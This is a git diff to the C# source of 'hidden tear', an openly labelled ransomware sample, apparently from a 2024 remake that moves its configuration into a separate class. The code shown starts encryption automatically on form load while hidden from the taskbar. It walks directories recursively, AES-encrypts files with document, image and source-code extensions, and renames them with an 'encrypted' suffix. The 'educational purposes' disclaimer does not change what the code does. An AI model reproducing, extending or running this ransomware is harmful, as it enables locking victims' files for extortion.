@@ -7,6 +7,7 @@
 |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
  
  * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
+ * Remake by 0xbdg(?0) / March 2024 /https://github.com/0xbdg  
  * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
  * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
  * 
@@ -60,9 +61,8 @@ namespace hidden_tear
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            Opacity = 0;
             this.ShowInTaskbar = false;
-            //starts encryption at form load
+            
             startAction();
 
         }
@@ -136,28 +136,19 @@ namespace hidden_tear
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
             File.WriteAllBytes(file, bytesEncrypted);
-            System.IO.File.Move(file, file+".locked");
-
-            
-            
+            System.IO.File.Move(file, file+Tools.Config.encryptedExtension);
 
         }
 
         //encrypts target directory
         public void encryptDirectory(string location, string password)
         {
-            
-            //extensions to be encrypt
-            var validExtensions = new[]
-            {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
-            };
 
             string[] files = Directory.GetFiles(location);
             string[] childDirectories = Directory.GetDirectories(location);
             for (int i = 0; i < files.Length; i++){
                 string extension = Path.GetExtension(files[i]);
-                if (validExtensions.Contains(extension))
+                if (Tools.Config.extensionToEncrypt.Contains(extension))
                 {
                     EncryptFile(files[i],password);
                 }
